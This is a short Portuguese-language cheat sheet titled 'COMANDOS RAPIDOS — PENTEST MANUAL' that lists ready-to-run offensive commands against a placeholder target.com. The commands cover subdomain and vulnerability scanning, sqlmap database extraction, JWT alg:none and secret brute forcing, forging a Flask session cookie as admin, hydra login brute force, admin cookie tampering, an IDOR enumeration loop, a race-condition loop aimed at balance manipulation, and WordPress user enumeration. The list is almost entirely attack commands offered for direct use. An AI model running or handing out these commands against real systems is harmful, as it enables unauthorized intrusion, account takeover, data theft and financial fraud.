================================================================
  COMANDOS RAPIDOS — PENTEST MANUAL
================================================================

# Descobrir subdomains
subfinder -d target.com -silent | httpx -title -tech-detect -status-code

# Scan completo Nuclei
nuclei -u https://target.com -t cves,misconfig,exposures,vulnerabilities,default-logins,takeovers,ssti,lfi,xss,ssrf -severity critical,high,medium

# SQLi rapido
sqlmap -u "https://target.com/page?id=1" --batch --dbs --level=3 --risk=3

# JWT attack
jwt_tool TOKEN -X a                            # alg:none
jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt  # brute force

# Flask session
flask-unsign --decode --cookie "SESSION_COOKIE"
flask-unsign --sign --cookie "{'role': 'admin'}" --secret 'secret'

# Brute force login
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Cookie tamper
curl -si https://target.com -H "Cookie: role=admin; isAdmin=true; user_id=1"

# IDOR test
for i in $(seq 1 20); do curl -si "https://target.com/api/user/$i" | grep -i 'email\|name\|200'; done

# Race condition (balance manipulation)
for i in $(seq 1 20); do curl -X POST "https://target.com/transfer" -d "amount=100" & done; wait

# WPScan
wpscan --url https://target.com --enumerate vp,u,ap --api-token TUA_KEY
